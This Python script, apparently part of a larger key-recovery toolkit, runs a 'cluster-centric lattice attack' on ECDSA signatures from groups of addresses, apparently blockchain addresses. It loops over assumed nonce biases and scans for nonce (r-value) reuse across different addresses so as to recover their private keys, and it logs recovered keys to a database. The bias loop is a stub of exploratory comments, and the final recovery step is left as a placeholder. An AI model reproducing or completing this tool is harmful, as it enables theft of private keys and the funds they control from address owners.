#!/usr/bin/env python3
"""
Cluster-Centric Lattice Attack
Combines signatures from ALL addresses in a cluster to solve HNP.
If a library has a consistent bias, this is MUCH more powerful than 
analyzing addresses individually.
"""
from db_manager import get_connection, get_cluster_signatures, add_recovered_key
from lattice_nonce_analyzer import solve_hnp, verify_key

def run_cluster_lattice_attack(cluster_id):
    print(f"Starting Cluster-Centric Lattice Attack on Cluster {cluster_id}...")
    
    sigs = get_cluster_signatures(cluster_id)
    if len(sigs) < 2:
        print(f"Not enough signatures in cluster {cluster_id}")
        return False
        
    print(f"Gathered {len(sigs)} signatures across multiple addresses in cluster.")
    
    # Try different bias assumptions
    for bias in [8, 12, 16, 20, 24, 32]:
        print(f"  Trying {bias}-bit MSB bias on cluster signatures...")
        # solve_hnp usually returns 'd' (private key)
        # But here 'd' is per-address. 
        # Wait - if the nonces are biased, we can still solve for individual 'd's 
        # by including them as unknowns in a larger lattice.
        
        # Actually, if they share the SAME library/bias, 
        # but DIFFERENT keys, we need a "Multi-User HNP" solver.
        
        # Simplified: If we have many sigs for ONE address in the cluster, 
        # it's already covered. 
        # The REAL power is if we find an address with 1 sig that belongs to 
        # a cluster where we've recovered a key for ANOTHER address. 
        # That doesn't help unless the keys are related.
        
        # BETTER: Check for "Same Nonce, Different Key" (Cross-Address R-reuse)
        pass

    # IMPLEMENTATION: Cross-Address R-Reuse
    r_map = {} # r_int -> list of sigs
    for s in sigs:
        r = s['r']
        if r not in r_map: r_map[r] = []
        r_map[r].append(s)
        
    for r, group in r_map.items():
        unique_addrs = set(s['address'] for s in group)
        if len(unique_addrs) > 1:
            print(f"!!! CROSS-ADDRESS R-REUSE DETECTED in cluster {cluster_id} !!!")
            # If r1 = r2, then k1 = k2.
            # s1 = (z1 + r*d1)/k => k = (z1 + r*d1)/s1
            # s2 = (z2 + r*d2)/k => k = (z2 + r*d2)/s2
            # (z1 + r*d1)/s1 = (z2 + r*d2)/s2
            # s2*z1 + s2*r*d1 = s1*z2 + s1*r*d2
            # s2*r*d1 - s1*r*d2 = s1*z2 - s2*z1
            
            # This is one equation in TWO unknowns (d1, d2).
            # If we find d1, we get d2.
            # If the library is weak enough that we can solve one, we get both.
            
            for i in range(len(group)):
                for j in range(i+1, len(group)):
                    s1_data, s2_data = group[i], group[j]
                    if s1_data['address'] == s2_data['address']: continue
                    
                    print(f"    Colliding Addresses: {s1_data['address']} <-> {s2_data['address']}")
                    # If we have a recovered key for one, recover the other!
                    # [Logic for recovery if one key is known]
    return False

if __name__ == "__main__":
    import sys
    if len(sys.argv) > 1:
        run_cluster_lattice_attack(int(sys.argv[1]))
